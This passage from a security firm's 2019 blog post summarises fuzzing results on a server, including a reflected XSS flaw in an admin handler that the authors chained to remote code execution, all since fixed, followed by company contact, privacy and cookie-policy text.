The first one affects only `400 Bad Request` responses, thus it seems hard to be used against the user. The second one was found in the administration handler. This handler is used by default in the administration panel but also can be set up as a handler in the main server. The problem lies in copying the invoked URL to a response. The URL is not encoded before put in HTML, CSS and JavaScript code, so special characters can be placed by an attacker.

As an authenticated administrator has access to powerful options in the panel, we created a Proof of Concept exploit to show how this vulnerability can be used to achieve Remote Code Execution.

After opening the URL all actions are executed by the exploit, no further user interaction was required. For easier development this exploit simulates filling proper inputs in the panel which is quite slow, thus some parts of the video are sped up.

## Summary

Utilizing fuzzing adjusted to the project’s features and additionally extending our approach with manual testing, several crashes and XSS vulnerabilities were found. One of them directly lead to RCE.

All reported bugs have been fixed.

Written on November 15, 2019 by
Mateusz Kocielski, Michał Dardas

## We invite you to contact us

through the following form:

**I agree to the processing of my personal data and sending the offer.**
Rules for the processing of personal data.

send

LogicalTrust sp. z o.o.
sp. k.

Stanisławowska 47
54-611 Wrocław, Poland, EU

NIP: 8952177980
KRS: 0000713515

**T.: +48 797 772 743**

**office@logicaltrust.net**
Key:   [PGP/GPG](/logicaltrust.gpg)

![LogicalTrust](/images/logo.svg)

copyright © 2007 - 2024 LogicalTrust

We support:
![las na zawsze - logo](/images/foundationlogo-lasnazawsze_a.png)
![unicef - logo](/images/foundationlogo-unicef_a.png)

×
## Rules for the processing of personal data.

According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:

* **Data Administrator:** The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.
* **Contact with the Data Administrator:** You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.
* **Purpose and Legal Basis for Processing Personal Data:** Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).
* **Data Processing Period:** Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.
* **Scope of Processed Data:** The scope of processed data includes: first name, last name, email, and phone number.
* **Recipients of Personal Data:** In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).
* **Data Transfers:** Your personal data will not be transferred outside the European Economic Area.
* **Rights and Entitlements:** You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.
* **Additional Information:** Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.

×
## Cookie policy

* 1. **About cookies** - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.
* 2. **Which type of cookies do we use** - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.
* 3. **Why do we use cookies?** - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.
* 4. **How to use and how to disable cookies** - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).

This page uses cookies. Click here to learn more. Accept Reject


